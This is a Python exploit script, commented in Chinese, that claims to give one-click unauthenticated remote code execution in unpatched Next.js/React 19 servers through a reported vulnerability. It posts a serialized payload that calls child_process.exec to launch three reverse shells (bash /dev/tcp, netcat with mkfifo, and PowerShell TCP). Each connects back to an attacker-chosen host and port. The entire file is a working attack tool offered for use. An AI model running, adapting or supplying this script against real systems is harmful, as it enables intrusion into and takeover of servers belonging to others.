#!/usr/bin/env python3
# Github: https://github.com/Ashwesker/Blackash-CVE-2025-55182
# CVE-2025-55182 – Next.js / React 19 未经身份验证的远程代码执行 → 即时反弹Shell
# 适用于所有未打补丁的 Next.js 15.x / 16.x 版本（截至2025年12月3日）
# 一键反弹shell – 无需交互

import requests
import sys
import time

if len(sys.argv) != 3:
    # 用法:   python3 CVE-2025-55182-revshell.py <目标URL> <LHOST:LPORT>
    # 示例: python3 CVE-2025-55182-revshell.py https://vuln.example.com 10.10.14.66:4444
    print("用法:   python3 CVE-2025-55182-revshell.py <目标URL> <LHOST:LPORT>")
    print("示例: python3 CVE-2025-55182-revshell.py https://vuln.example.com 10.10.14.66:4444")
    sys.exit(1)

target = sys.argv[1].rstrip("/")
lhost, lport = sys.argv[2].split(":")

print("[+] CVE-2025-55182 即时反弹Shell")
print(f"[+] 目标 : {target}")
print(f"[+] LHOST  : {lhost}")
print(f"[+] LPORT  : {lport}")
# 启动监听器 → nc -lvnp {lport}
print(f"[+] 将在3秒内启动监听器 → nc -lvnp {lport}")
time.sleep(3)

# 三个载荷 – 至少有一个会在Linux/Windows上成功
payloads = [
    # Bash反弹shell (最常见)
    f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",

    # Netcat反弹shell (备用方案)
    f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f",

    # PowerShell反弹shell (Windows Azure / Windows主机)
    f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
]

url = f"{target}/_next/static/chunks/react-flight"
boundary = "----WebKitFormBoundary1337pwn"

for i, cmd in enumerate(payloads, 1):
    # 发送载荷 {i}/3 →
    print(f"[+] 发送载荷 {i}/3 → ", end="")
    evil = f'1{{"__type":"Function","code":"global.process.mainModule.require(\'child_process\').exec(\'{cmd}\')"}}'

    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"0\"\r\n\r\n"
        f"{evil}\r\n"
        f"--{boundary}--\r\n"
    )

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "User-Agent": "Mozilla/5.0 (CVE-2025-55182)"
    }

    try:
        r = requests.post(url, data=body, headers=headers, timeout=10, verify=False)
        # 已发送 (状态码 {r.status_code})
        print(f"已发送 (状态码 {r.status_code})")
        time.sleep(1)
    except requests.exceptions.ReadTimeout:
        print("请求超时，请检查目标服务是否正常运行。")
    except requests.exceptions.ConnectionError:
        print("无法连接到目标服务，请确认服务地址和端口是否正确。")

# 所有载荷已发送。检查你的监听器 —— 你现在应该已经获得了shell！
# 如果没有反应 → 目标已打补丁或WAF正在阻止multipart请求
print("\n[+] 所有载荷已发送。检查你的监听器 —— 你现在应该已经获得了shell！")
print("    如果没有反应 → 目标已打补丁或WAF正在阻止multipart请求")
